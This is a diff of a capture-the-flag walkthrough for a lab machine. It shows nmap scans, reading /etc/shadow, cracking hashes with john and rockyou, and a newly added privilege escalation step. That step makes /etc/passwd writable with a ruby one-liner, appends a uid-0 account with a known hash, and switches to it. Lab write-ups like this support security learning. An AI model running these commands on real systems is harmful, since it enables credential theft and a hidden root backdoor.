@@ -12,7 +12,7 @@ Initial scan
 nmap -A $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 Longer scan
 
@@ -22,7 +22,7 @@ Longer scan
 nmap -sV -sT -O -p 1-65535 $VICTIM
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## **TCP/80 - HTTP**
 
@@ -90,7 +90,7 @@ ls -lah /etc/shadow
 
 **Victim**
 
-Now that we can read both f these files we can transfer them to Kali.
+Now that we can read both f these files we can transfer them to Kali. I let this run for a while but it wasn't cracking any hashes.
 
 ```
 cat /etc/passwd
@@ -109,7 +109,7 @@ unshadow passwd shadow > passwords.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
 ```
 
-
+I went back to the check the box and found the database credentials&#x20;
 
 **Victim**
 
@@ -154,7 +154,17 @@ Password: pretonnevippasempre
 
 
 
+## Privilege Escalation
 
+Since I had access to change any file already I just added a new root user to passwd
 
+**Victim**
 
+```
+ruby -e 'require "fileutils"; FileUtils.chown("george", "george", "/etc/passwd")'
+echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
+su new
+Password: 123
+```
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
